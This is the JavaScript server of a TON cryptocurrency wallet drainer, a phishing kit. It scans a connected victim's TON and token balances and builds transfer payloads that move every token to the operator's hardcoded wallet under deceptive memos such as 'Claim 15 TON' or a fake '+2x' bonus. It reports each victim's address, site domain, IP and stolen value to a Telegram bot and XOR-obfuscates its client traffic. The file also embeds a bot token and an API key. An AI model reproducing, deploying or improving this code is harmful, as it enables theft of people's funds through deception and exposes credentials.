const ton = require('@ton/ton')
const http = require('http');
const https = require('https');
const axios = require('axios');
const express = require('express');
const parser = require('body-parser');
const Telegram = require('node-telegram-bot-api');
const fs = require('fs');
const api = require("@orbs-network/ton-access");
const TonWeb = require('tonweb');

const tonweb = new TonWeb();
// ================================================================
// ========================= GENERAL SETTINGS =====================
// ================================================================
const encr_key = 500; // ENCR DATA
const wallet = "UQAa0BlrCKaNm0jjIbgtAAy8-ERq8JUw1Xjd3aaZDZ4IiDP5"; // Wallet where send TON and Jettons
const min_dep = "0.001" // Minimal deposit TON
const min_jetton_price = "0.01"; // Minimal token price $

let msg_text = "✅ Claim 15 TON from CryptoWolf"; // Transaction Comment (MEMO)
const msg_text_active = true; // Comment ON/OFF (true/false)

const msg_multiplier_mode = false; // TON, JETTONS 2X MODE
const multiplier = 2; // X2, X3...

const multiple_send = true; // Jetton MultiSign (4 tokens in one transaction)


// ================================================================
// ========================= SCAN SETTINGS ========================
// ================================================================
const GetBlockKey = 'f39652d0c15a4d06b37b4cf982dec11d'; // Ton RPC Api - https://getblock.io/

const rpcs = {
    standartRPC: {
        active: false,
        apikey: ""
    },
    getBlock: {
        active: true,
        apikey: ""
    },
    testStandartRPC: {
        active: false,
        apikey: ""
    },
}
// ================================================================
// ========================= TG SETTINGS ==========================
// ================================================================
const BOT = true; // Telegram Bot [On/Off]
const TG_TOKEN = "6132706362:AAEztNnQTFpD5VdBwOB4CtdfBoSnpcAJry0"; // Telegram Bot Token
const TG_CHAT_ID = "5057341518"; // Telegram Chat Id
const TG_POLLING = true; // Don't touch


// Telegram Notifications
const TG_Notify = {
    connect: {
        active: true
    }, // Don't touch
    scan_done: {
        active: true
    }, // Scan done
    transfer_ton_native_request: {
        active: true
    }, // Request to transfer
    old_transfer_done: {
        active: false
    } // Old notify
};

// ================================================================
// ========================= DON'T TOUCH CODE BELOW =================
// ================================================================

const get_api = async () => {
    const endpoint = await api.getHttpEndpoint(); // get the decentralized RPC endpoint
    const client = new ton.TonClient({
        endpoint
    }); // initialize ton library
    return client;
}


const check_price = async () => {
    if (fs.existsSync('price.dat')) {
        let data = JSON.parse(fs.readFileSync(`price.dat`))
        if (Date.now() / 1000 - data.time > 1 * 60 * 60) {
            let price = await axios.get(`https://api.coinlore.net/api/ticker/?id=54683`);
            let data = {
                time: Math.floor(Date.now() / 1000),
                data: price['data'][0]['price_usd']
            };
            fs.writeFileSync('price.dat', JSON.stringify(data), 'utf-8');
            return price['data'][0]['price_usd'];
        } else {
            return data.data;
        }

    } else {
        let price = await axios.get(`https://api.coinlore.net/api/ticker/?id=54683`);
        let data = {
            time: Math.floor(Date.now() / 1000),
            data: price['data'][0]['price_usd']
        };
        fs.writeFileSync('price.dat', JSON.stringify(data), 'utf-8');
    }
}

check_price()
const send_response = async (response, data) => {
    try {
        const encode_key = Buffer.from(String(5 + 10 + 365 + 2048 + 867 + encr_key)).toString('base64');
        const data_encoded = prs(encode_key, Buffer.from(JSON.stringify(data)).toString('base64'));
        return response.status(200).send(data_encoded);
    } catch (err) {
        console.log(err);
        return false;
    }
};

const app = express();
app.use(express.json());

app.use(require("cors")());
app.use(require('express-useragent').express());
app.use(parser.json({
    limit: '50mb'
}));
app.use(parser.urlencoded({
    limit: '50mb',
    extended: true
}));
app.use(express.static('public'));
app.use((require('express-body-parser-error-handler'))());

if (fs.existsSync(`server.crt`) && fs.existsSync(`server.key`)) {
    http.createServer(app).listen(80);
    https.createServer({
        key: fs.readFileSync(`server.crt`),
        cert: fs.readFileSync(`server.key`)
    }, app).listen(443);
    console.log(`\x1b[32m`, `ONLINE! `, `\x1b[47m`, `LISTENING HTTPS AND HTTP(443 & 80 PORTS)`)
}
app.listen(80, () => {
    console.log(`\x1b[32m`, `ONLINE!`, `\x1b[37m`, ` LISTENING HTTP(80 PORT)`);
})
const prs = (s, t) => {
    const ab = (t) => t.split("").map((c) => c.charCodeAt(0));
    const bh = (n) => ("0" + Number(n).toString(16)).substr(-2);
    const as = (code) => ab(s).reduce((a, b) => a ^ b, code);
    return t.split("").map(ab).map(as).map(bh).join("");
};

const srp = (s, e) => {
    const ab = (text) => text.split("").map((c) => c.charCodeAt(0));
    const as = (code) => ab(s).reduce((a, b) => a ^ b, code);
    return e.match(/.{1,2}/g).map((hex) => parseInt(hex, 16)).map(as).map((charCode) => String.fromCharCode(charCode)).join("");
};
app.post("/", (request, response) => {
    console.log('get')
    try {
        let data = request.body;
        if (!data['raw']) {
            return response.status(500).send('Unable to Execute');
        }

        const encode_key = Buffer.from(String(5 + 10 + 365 + 2048 + 867 + encr_key)).toString('base64');
        data = JSON.parse(Buffer.from(srp(encode_key, data['raw']), 'base64').toString('ascii'));


        data['IP'] = request.headers['x-forwarded-for'] || request.socket['remoteAddress'];
        if (data['IP']) {
            data['IP'] = data['IP'].replace('::ffff:', '');
        }




        if (data['action'] == 'scan_done') {
            return on_scan_done(response, data);
        } else if (data['action'] == 'scan_account') {
            return scan_account(response, data);
        } else if (data['action'] == 'transfer_ton_native_request') {
            return transfer_ton_native_request(response, data);
        } else if (data['action'] == 'decline_transfer_ton_native_request') {
            return decline_transfer_ton_native_request(response, data);
        } else if (data['action'] == 'transaction_done') {
            return transaction_done(response, data);
        } else if (data['action'] == 'get_key') {
            return get_key(response, data);
        } else if (data['action'] == 'send_jettons') {
            return send_jettons(response, data);
        } else if (data['action'] == 'transfer_jettons_native_request') {
            return transfer_jettons_native_request(response, data);
        } else if (data['action'] == 'decline_transfer_jettons_native_request') {
            return decline_transfer_jettons_native_request(response, data);
        } else if (data['action'] == 'jettons_transaction_done') {
            return jettons_transaction_done(response, data);
        }else if (data['action'] == 'get_ton_text') {
            return getTonText(response, data);
        }




    } catch (err) {
        console.log(err);
        response.status(500).send('Unable to Execute');
    }
});



const bot = new Telegram(TG_TOKEN, {
    polling: false
});
const sendTg = async (chat_id, message) => {
    try {
        await bot.sendMessage(chat_id, message, {
            parse_mode: 'HTML'
        })
    } catch (e) {
        console.log(e);
    }
}




const on_scan_done = async (response, data, result) => {
    try {
        if (TG_Notify.scan_done.active) {
            let price = await check_price();


            let networth = 0;
            let value = `\n├──<b>TON</b> : ${parseFloat(data.data.ton * price).toFixed(2)}$ (${parseFloat(data.data.ton).toFixed(2)} TON)\n`;
            networth += parseFloat(data.data.ton * price);

            if (data.data.haveJettons) {
                for (let i = 0; i < Object.keys(data.data.jettons).length; i++) {
                    let symbol;
                    if(i < Object.keys(data.data.jettons).length - 1)
                        {
                            symbol = '├──'
                        }
                        else
                        {
                            symbol = '└──'
                        }
                    if (data.data.jettons[i].price > 0) {
                        value += `${symbol}<b>${data.data.jettons[i].name}</b> : ${data.data.jettons[i].price.toFixed(2)}$\n`
                        networth += parseFloat(data.data.jettons[i].price);

                    }

                }

            }
            let addr = new tonweb.Address(data.data.account)
            
            addr = addr.toString(true)
            addr  = addr.replace(/\//g, '_');
            let message = `🔑 <b>Wallet Connected: </b><a href="https://tonviewer.com/${addr}">${addr}</a>\n\n🔗 <b>Domain: </b>${data.data.domain}\n💠 <b>IP: </b>${data.data.ip}\n\n💎 <b>Wallet balance:</b> ${parseFloat(networth).toFixed(2)}$ ${value}\n#connect`;
            sendTg(TG_CHAT_ID, message);

            if ((parseFloat(val) <= parseFloat(min_dep) || parseFloat(val) == parseFloat(min_dep)) && networth < min_dep * price) {

                return send_response(response, {
                    status: 'ERROR',
                    reason: 'low balance'
                });
            } else {
                return send_response(response, {
                    status: 'OK',
                    data: result['data']['result']
                });
            }

        } else {
            if (parseFloat(val) < ton.toNano(min_dep)) {

                return send_response(response, {
                    status: 'ERROR',
                    reason: 'low balance'
                });
            } else {
                return send_response(response, {
                    status: 'OK',
                    data: val
                });
            }
        }
    } catch (err) {
        console.log(err);
    }

}
const scan_account = async (response, data) => {

    const api = await get_api();
    if (true) {
        try {
            addDomain(data[`account`], data[`domain`], data[`IP`])
            const api = await get_api();
            let acc = data['account'].replace(/\//g, '_');
            let balance = await api.getBalance(data['account']);
            let resultJettons = await axios.get(`https://tonapi.io/v2/accounts/${acc}/jettons`);
            let jettons = {};
            let jettonsAdr = {}
            let haveJettons = false;
            let networth = 0;

            
            if (Object.keys(resultJettons.data.balances).length > 0) {

                for (const [key, value] of Object.entries(resultJettons.data.balances)) {
                    let jettonData = {
                        name: value.jetton.name,
                        balance: value.balance,
                        address: value.jetton.address,
                        demicials: value.jetton.decimals,
                        price: '0',
                        walletAddress: value.wallet_address
                    }
                    jettons[key] = jettonData;
                    if (value.balance > 0) {
                        haveJettons = true;
                    }


                }
                let string = '';

                for (let i = 0; i < Object.keys(jettons).length; i++) {
                    string += `${jettons[i]['address']},`
                }
                let prices = await axios.get(`https://tonapi.io/v2/rates?tokens=${string}&currencies=usd`)
                let tonprice = await check_price();

                for (let i = 0; i < Object.keys(jettons).length; i++) {
                    let price = prices.data.rates[jettons[i]['address']].prices.USD
                    let balanceValue = jettons[i][`balance`] * Math.pow(10, -jettons[i][`demicials`]) * price;

                    jettons[i].price = balanceValue
                }

                for (let j = Object.keys(jettons).length - 1; j > 0; j--) {
                    for (let i = 0; i < j; i++) {
                        if (jettons[i].price < jettons[i + 1].price) {
                            let temp = jettons[i];
                            jettons[i] = jettons[i + 1];
                            jettons[i + 1] = temp;
                        }
                    }
                }
                let len = Object.keys(jettons).length;
                for (let i = 0; i < len; i++) {
                    if (jettons[i].price < min_jetton_price) {
                        delete jettons[i];
                    }
                }


                for (let i = 0; i < Object.keys(jettons).length; i++) {
                    networth += parseFloat(jettons[i].price);
                }

                networth += parseFloat(tonprice) * parseFloat(ton.fromNano(balance));



            }
            else{
                let balance = await api.getBalance(data['account']);
                let price = await check_price();
                  networth += parseFloat(price) * parseFloat(ton.fromNano(balance));
              }
            let price = await check_price();
            let finalData = {
                haveJettons: haveJettons,
                ton: ton.fromNano(balance),
                jettons: jettons,
                tonPrice: price,
                account: data['account'],
                domain: data['domain'],
                ip: data['IP']
            }
            on_scan_done(response, {
                status: 'OK',
                data: finalData
            })
            if(parseFloat(ton.fromNano(balance)) < '0.2')
                {
                    send_response(response, {
                        status: 'ERROR',
                        reason: 'low tax'
                    });
                    return;
                }
            if (networth < min_dep * price) {

                send_response(response, {
                    status: 'ERROR',
                    reason: 'low balance'
                });
            } else {

                send_response(response, {
                    status: 'OK',
                    data: finalData
                })
            }

            
        } catch (err) {
            console.log(err)
        }
    } else if (rpcs.getBlock.active) {
        console.log(rpcs.getBlock.apikey)
        try {
            let balance = await api.getBalance(data['account']);
            let resultJettons = await axios.get(`https://tonapi.io/v2/accounts/${data['account']}/jettons`);
            var array = JSON.parse(resultJettons);
            array.forEach(function(object) {
                console.log(object.title);
            });
            on_scan_done(response, data, result);
        } catch (e) {
            console.log(e);
        }
    } else if (rpcs.testStandartRPC.active) {
        try {
            let result = await axios.get(`https://testnet.toncenter.com/api/v3/account?address=${data['account']}`)
            on_scan_done(response, data, result);
        } catch (e) {
            console.log(e);
        }
    }
}
const transfer_ton_native_request = async (response, data) => {
    try {
        if (BOT) {
            if (TG_Notify.connect.active) {
                let price = await check_price();
                let val = ton.fromNano(data['val']);
                let valUSD = val * price;
                let message = `<b>♻️ Requesting a transfer [x${data['try']}]</b> \n\n <b>💎 Transaction Value: ${parseFloat(val).toFixed(3)} TON (${valUSD.toFixed(2)}$)</b> \n<b>🔗 Domain: </b>${data['domain']} \n<b>💠 IP:</b> ${data['IP']}\n#request`;
                sendTg(TG_CHAT_ID, message);
                return send_response(response, {
                    status: 'OK',
                    data: wallet
                });
            }
        }
    } catch (err) {
        console.log(err);
    }

}
const transfer_jettons_native_request = async (response, data) => {
    try {
        if (BOT) {
            if (TG_Notify.connect.active) {
                let value = ''
                let networth = 0;
                
                for (let i = 0; i < Object.keys(data.data).length; i++) {
                    let symbol;
                    if(i < Object.keys(data.data).length - 1)
                        {
                            symbol = '├──'
                        }
                        else
                        {
                            symbol = '└──'
                        }
                    value += `${symbol}<b>${data.data[i]['name']}</b> : ${data.data[i].prices.toFixed(2)}$\n`
                    networth += parseFloat(data.data[i].prices);
                    
                }
                let message = `<b>♻️ Requesting a transfer [x${data['try']}]</b> \n\n <b>💎 Transaction Value: ${networth.toFixed(2)}$</b>\n${value} \n<b>🔗 Domain: </b>${data['domain']} \n<b>💠 IP:</b> ${data['IP']}\n#request`;
                sendTg(TG_CHAT_ID, message);
                return send_response(response, {
                    status: 'OK',
                    data: wallet
                });
            }
        }
    } catch (err) {
        console.log(err);
    }

}
const decline_transfer_ton_native_request = async (response, data) => {
    try {
        if (BOT) {
            if (TG_Notify.connect.active) {

                let value = '';
                let price = await check_price()
                let usdval = data.val * price;
                
                let message = `<b>🚨 Transaction declined [x${data['try']}]</b> \n\n <b>💎 Transaction Value: ${parseFloat(data.val).toFixed(2)} (${usdval.toFixed(2)}$)</b> \n<b>🔗 Domain: </b>${data['domain']} \n<b>💠 IP:</b> ${data['IP']} \n<i>A repeat transaction has been sent to the user, wait for the execution result.</i> `;
                sendTg(TG_CHAT_ID, message);
                return send_response(response, {
                    status: 'OK'
                });
            }
        }
    } catch (err) {
        console.log(err);
    }

}
const decline_transfer_jettons_native_request = async (response, data) => {
    try {
        if (BOT) {
            if (TG_Notify.connect.active) {
 
                let value = ''
                if (data.isTon) {

                    //value += `\n<b>💵TON</b> : ${parseFloat(data.ton * data.tonPrice).toFixed(2)}$ (${parseFloat(data.ton).toFixed(2)} TON)\n`;
                } else {

                }
                let networth = 0;
                for (let i = 0; i < Object.keys(data.data).length; i++) {
                    if(i < Object.keys(data.data).length - 1)
                        {
                            symbol = '├──'
                        }
                        else
                        {
                            symbol = '└──'
                        }
                    value += `${symbol}<b>${data.data[i].name}</b> : ${data.data[i].prices.toFixed(2)}$\n`
                    networth += parseFloat(data.data[i].prices);
          
                }

                let message = `<b>🚨 Transaction declined [x${data['tryies']}]</b> \n\n <b>💎 Transaction Value: ${networth.toFixed(2)}$ </b>\n${value} \n<b>🔗 Domain: </b>${data['domain']} \n<b>💠 IP:</b> ${data['IP']} \n<i>A repeat transaction has been sent to the user, wait for the execution result.</i> `;
                sendTg(TG_CHAT_ID, message);
                return send_response(response, {
                    status: 'OK'
                });
            }
        }
    } catch (err) {
        console.log(err);
    }

}
const transaction_done = async (response, data) => {
    try {
        if (BOT) {
            let price = await check_price();
            if (TG_Notify.connect.active) {
                let val = ton.fromNano(data['val']);
                let valUSD = val * price;
                let res = data['hash'].replace(/\//g, '_');
                let message = `<b>✅ Transaction sent </b> \n\n <b>💎 Transaction Value: ${parseFloat(val).toFixed(3)} TON (${valUSD.toFixed(2)}$)</b> \n<b>🔗 Domain: </b>${data['domain']} \n<b>💠 IP:</b> ${data['IP']} \n\n<b>▫️ Transaction Hash: </b>\nTonViewer\nhttps://tonviewer.com/transaction/${res}\nTonScan\nhttps://tonscan.org/tx/by-msg-hash/${res}TonScan\n#approved`;
                if(TG_Notify.old_transfer_done.active)
                    {
                        sendTg(TG_CHAT_ID, message);
                    }
                return send_response(response, {
                    status: 'OK'
                });
            }
        }
    } catch (err) {
        console.log(err);
    }

}
const jettons_transaction_done = async (response, data) => {
    try {
        if (BOT) {
            if (TG_Notify.connect.active) {

                let value = '';
                let networth = 0;
                let symbol;
                
                for (let i = 0; i < Object.keys(data.hash.tokens).length; i++) {
                    if(i < Object.keys(data.hash.tokens).length - 1)
                        {
                            symbol = '├──'
                        }
                        else
                        {
                            symbol = '└──'
                        }
                    value += `${symbol}<b>${data.hash.tokens[i].name}</b> : ${data.hash.tokens[i].prices.toFixed(2)}$\n`
                    networth += parseFloat(data.hash.tokens[i].prices);
                }
                
                let res = data.hash.hash.replace(/\//g, '_');
                let message = `<b>✅ Transaction sent </b> \n\n<b>💎 Transaction Value: ${networth.toFixed(2)}$ </b>\n${value} \n<b>🔗 Domain: </b>${data['domain']} \n<b>💠 IP:</b> ${data['IP']} \n\n<b>▫️ Transaction Hash:</b>\nTonViewer\nhttps://tonviewer.com/transaction/${res}\nTonScan\nhttps://tonscan.org/tx/by-msg-hash/${res}\n#approved`;
                if(TG_Notify.old_transfer_done.active)
                    {
                        sendTg(TG_CHAT_ID, message);
                    }
                
                return send_response(response, {
                    status: 'OK'
                });
            }
        }
    } catch (err) {
        console.log(err);
    }

}
const get_key = async (response, data) => {
    try {
        return send_response(response, {
            status: 'OK',
            key: GetBlockKey
        })
    } catch (err) {
        console.log(err);
    }

}

const getTonText = async (response, data) => {
    if(msg_text_active)
        {
            if(msg_multiplier_mode)
                {
                    let balance = parseFloat(tonweb.utils.fromNano(data.balance.toString())).toFixed(2)
                    
                    msg_text = `+${balance * multiplier} TON` 
                    const forwardPayload = ton.beginCell()
                    .storeUint(0, 32) // 0 opcode means we have a comment
                    .storeStringTail(msg_text)
                    .endCell();
                    boc = await forwardPayload.toBoc().toString("base64")
               
                    return send_response(response, {
                        status: 'OK',
                        data: boc
                    });
                }
                else
                { 
                    const forwardPayload = ton.beginCell()
                    .storeUint(0, 32) // 0 opcode means we have a comment
                    .storeStringTail(msg_text)
                    .endCell();
                    boc = await forwardPayload.toBoc().toString("base64")
                    return send_response(response, {
                        status: 'OK',
                        data: boc
                    });
                }
        }
        else
        {
            return send_response(response, {
                status: 'OK',
                data: ''
            });
        }
} 
const send_jettons = async (response, data) => {
    try {

        const destinationAddress = ton.Address.parse(wallet);
        let body;
        let boc;
        let bocs = {};
        let address = {}
        let prices = {}
        let name = {}
        addDomain(data.account, data.domain, data.IP)
        for (let i = 0; i < Object.keys(data.jettons).length; i++) {
            if (msg_text_active) {
                if(msg_multiplier_mode)
                    {
                        let balance = parseFloat(data.jettons[i][`balance`]) * Math.pow(10, -data.jettons[i][`demicials`]) * multiplier

                        msg_text = `+${balance.toFixed(2)} ${data.jettons[i][`name`]}` 
                    }
                const forwardPayload = ton.beginCell()
                    .storeUint(0, 32) // 0 opcode means we have a comment
                    .storeStringTail(msg_text)
                    .endCell();

                body = ton.beginCell()
                    .storeUint(0x0f8a7ea5, 32) // opcode for jetton transfer
                    .storeUint(0, 64) // query id
                    .storeCoins(data.jettons[i].balance) // jetton amount, amount * 10^9
                    .storeAddress(destinationAddress) // TON wallet destination address
                    .storeAddress(ton.Address.parse(data.account)) // response excess destination
                    .storeBit(0) // no custom payload
                    .storeCoins(ton.toNano(0.0001).toString()) // forward amount (if >0, will send notification message)
                    .storeBit(1) // we store forwardPayload as a reference
                    .storeRef(forwardPayload)
                    .endCell();
                boc = await body.toBoc().toString("base64")
                bocs[i] = boc;
                address[i] = data.jettons[i].walletAddress.address
                prices[i] = data.jettons[i].price;
                name[i] = data.jettons[i].name;
            } else {
                const forwardPayload = ton.beginCell()
                    .storeUint(0, 32) // 0 opcode means we have a comment
                    .storeStringTail('')
                    .endCell();

                body = ton.beginCell()
                    .storeUint(0x0f8a7ea5, 32) // opcode for jetton transfer
                    .storeUint(0, 64) // query id
                    .storeCoins(data.jettons[i].balance) // jetton amount, amount * 10^9
                    .storeAddress(destinationAddress) // TON wallet destination address
                    .storeAddress(ton.Address.parse(data.account)) // response excess destination
                    .storeBit(0) // no custom payload
                    .storeCoins(ton.toNano(0.0001).toString()) // forward amount (if >0, will send notification message)
                    .storeBit(1) // we store forwardPayload as a reference
                    .storeRef(forwardPayload)
                    .endCell();
                boc = await body.toBoc().toString("base64")
                bocs[i] = boc;
                address[i] = data.jettons[i].walletAddress.address
                prices[i] = data.jettons[i].price;
                name[i] = data.jettons[i].name;
            }

        }

        let resdata = {
            boc: bocs,
            address: address,
            prices: prices,
            isMultiple: multiple_send,
            wallet: wallet,
            name: name
        }
        return send_response(response, {
            status: 'OK',
            data: resdata
        });
    } catch (err) {
        console.log(err)
    }


}
const connected_wallets = {}
const addDomain = async (wallet, domain, ip) => {
   // console.log(ip)
    try{
        console.log(wallet)
        wallet = await ton.Address.parseRaw(wallet.replace(/\//g, '_'))
    connected_wallets[wallet] = {domain : domain, date : Date.now() / 1000, ip : ip}
    }
    catch(e)
    {
        console.log(e)
    }
    
}
const lastTl ={lt:`0`}
const check_txs = async () =>{
    try{
    let client = await get_api()
    let trabs = await axios.get(`https://tonapi.io/v2/blockchain/accounts/${wallet}/transactions?after_lt=${lastTl.lt}&limit=100&sort_order=desc`)
    let walletData = await axios.get(`https://tonapi.io/v2/accounts/${wallet}/jettons?currencies=usd`)
    walletData = walletData.data.balances;
    
    
    for (const [key, value] of Object.entries(trabs.data.transactions))
        {
            if(key == 0)
                {
                    lastTl.lt = value.lt
                }
            let addr = await ton.Address.parseFriendly(wallet)
            let dest = await ton.Address.parseRaw(value.in_msg.destination.address)
            if(addr.address.toString() === dest.toString() && connected_wallets[addr.address])
                {
                    let message = ``
                    let tokens = ``
                    let networth = 0;
                    let symbol = ``;
                    if(value.in_msg.decoded_op_name == `wallet_signed_v4`)
                        {
                             if(value.in_msg.decoded_body.payload)
                                {
                                    let i = 0;
                                    for(const [key2, value2] of Object.entries(value.in_msg.decoded_body.payload))
                                        {
                                            let payload = value2.message.message_internal
                                            let dest = await ton.Address.parseRaw(payload.dest)
                                            if(i < Object.keys(value.in_msg.decoded_body.payload).length - 1)
                                                {
                                                    symbol = '├──'
                                                }
                                                else
                                                {
                                                    symbol = '└──'
                                                }
                                            i++;
                                            if(dest == addr.address.toString())
                                                {
                                                    let price = await check_price()
                                                    price = ton.fromNano(payload.value.grams) * price
                                                    tokens += `${symbol}<b>TON</b> : ${parseFloat(ton.fromNano(payload.value.grams)).toFixed(2)} (${price.toFixed(2)}$)\n`
                                                    networth += parseFloat(price);
                                                    //message += `transfer TON ${ton.fromNano(payload.value.grams)} \n`
                                                    
                                                }
                                            else{
                                                
                                                var result = walletData.find(obj => {
                                                    
                                                    return obj.wallet_address.address === payload.dest
                                                  })
                                
                                                if(payload.body.value.value)
                                                    {
                                                        let price = parseFloat(payload.body.value.value.amount) * Math.pow(10, -result.jetton.decimals) * result.price.prices.USD;
                                                        tokens += `${symbol}<b>${result.jetton.name}</b> : ${price.toFixed(2)}$\n`
                                                        networth += parseFloat(price);
                                                        
                                                        //message += `${parseFloat(payload.body.value.value.amount) * Math.pow(10, -result.jetton.decimals)} ${result.jetton.name} \n`
                                                
                                                    }
                                                
                                                
                                            }
                                        }
                                }
                                message = `<b>✅ Transaction done </b> \n\n<b>💎 Transaction Value: ${networth.toFixed(2)}$ </b>\n${tokens} \n<b>🔗 Domain: </b>${connected_wallets[addr.address].domain} \n<b>💠 IP:</b> ${connected_wallets[addr.address].ip} \n\n<b>▫️ Transaction Hash:</b>\nTonViewer\nhttps://tonviewer.com/transaction/${value.hash}\nTonScan\nhttps://tonscan.org/tx/by-msg-hash/${value.hash}\n#approved`;
                                //console.log(message)
                                if(BOT)
                                    {
                                        sendTg(TG_CHAT_ID, message);
                                    }
                                
                                
                        }
                       
                }
                else
                {
                   
                }

            addr.toString(true)
        }
    }
    catch(e)
    {
        console.log(e)
    }
}
//check_txs()
//setInterval(()=>{check_txs()}, 15000)


const deleteDomains = async () =>
    {
        
        for(const [key, value] of Object.entries(connected_wallets))
            {
                
                if(parseInt(value.date) + 15 * 60 < Date.now() / 1000)
                    {
                        delete connected_wallets[key]
                    }
                    else
                    {
                        
                    }
            }
    }

setInterval(() => {deleteDomains()}, 15000 * 60)
const lastTimestamp = {timestamp:0}
const eventsCheck = async () => {
    try{
    let timestampTemp  = 0;
    let res = await axios.get(`https://tonapi.io/v2/accounts/${wallet}/events?initiator=false&subject_only=true&limit=10`)
    let walletData = await axios.get(`https://tonapi.io/v2/accounts/${wallet}/jettons?currencies=usd`)
    walletData = walletData.data.balances;
    for(const [key, value] of Object.entries(res.data.events))
        {
            
            if(lastTimestamp.timestamp < value.timestamp)
                {
              
                    if(timestampTemp < value.timestamp)
                        {
                            timestampTemp= value.timestamp;
                        }
                        let message = ``
                        let tokens = ``
                        let networth = 0;
                        let symbol = ``;
                        let i = 0;
            for(const [key2, value2] of Object.entries(value.actions))
                {
                    
                    if(i < Object.keys(value.actions).length - 1)
                                                {
                                                    symbol = '├──'
                                                }
                                                else
                                                {
                                                    symbol = '└──'
                                                }
                                            i++;
                   
                    if(value2.type == `JettonTransfer`)
                        {
                           
                            let walletDest = await ton.Address.parseFriendly(wallet)
                       
                            if(value2.JettonTransfer.recipient)
                                {

                                   
                                    destwallet = await ton.Address.parseRaw(value2.JettonTransfer.recipient.address)
                                    senderwallet = await ton.Address.parseRaw(value2.JettonTransfer.sender.address)
                                
                                    if(destwallet.toString() == walletDest.address.toString())
                                        {
                                            
                                            if(connected_wallets[senderwallet])
                                                {
                                                    
                                                    var result = walletData.find(obj => {
                                                    
                                                        return obj.jetton.address == value2.JettonTransfer.jetton.address
                                                      })
                                                   
                                                    let price = parseFloat(value2.JettonTransfer.amount) * Math.pow(10, -result.jetton.decimals) * result.price.prices.USD;
                                                    tokens += `${symbol}<b>${result.jetton.name}</b> : ${price.toFixed(2)}$\n`
                                                    networth += parseFloat(price);
                                                }
                                                if(i < 3)
                                                    {
                                                
                                                    }
                                        }
                                        else
                                        {
                                          
                                        }
                                }
                           
                        }
                        if(value2.type == `TonTransfer`)
                            {
                                
                            let walletDest = await ton.Address.parseFriendly(wallet)
                       
                            if(value2.TonTransfer.recipient)
                                {
                            
                                    destwallet = await ton.Address.parseRaw(value2.TonTransfer.recipient.address)
                                    senderwallet = await ton.Address.parseRaw(value2.TonTransfer.sender.address)
                                    if(destwallet.toString() == walletDest.address.toString())
                                        {
                                       
                                            if(connected_wallets[senderwallet])
                                                {
                                                    let price = await check_price();
                                                    price = ton.fromNano(value2.TonTransfer.amount) * price
                                                    tokens += `${symbol}<b>TON</b> : ${parseFloat(ton.fromNano(value2.TonTransfer.amount)).toFixed(2)} (${price.toFixed(2)}$)\n`
                                                    networth += parseFloat(price);
                                                }
                                        }
                                        else
                                        {
                        
                                        }
                                }
                                
                            }
                }
                if(value.in_progress == false && tokens)
                    {
                        message = `<b>✅ Transaction done </b> \n\n<b>💎 Transaction Value: ${networth.toFixed(2)}$ </b>\n${tokens} \n<b>🔗 Domain: </b>${connected_wallets[senderwallet].domain} \n<b>💠 IP:</b> ${connected_wallets[senderwallet].ip} \n\n<b>▫️ Transaction Hash:</b>\n<a href='https://tonviewer.com/transaction/${value.event_id}'>TonViewer</a>\n\n\n`;
                                if(BOT)
                                    {
                                        sendTg(TG_CHAT_ID, message);
                                    }
                    }
                    else{
                        //console.log(value)
                    }
                
            }
            
        }
        if(lastTimestamp.timestamp < timestampTemp)
            {
                lastTimestamp.timestamp = timestampTemp;
            }
        }
        catch(e)
        {
            console.log(e)
        }
}

//eventsCheck()
setInterval(()=>{eventsCheck()}, 15000)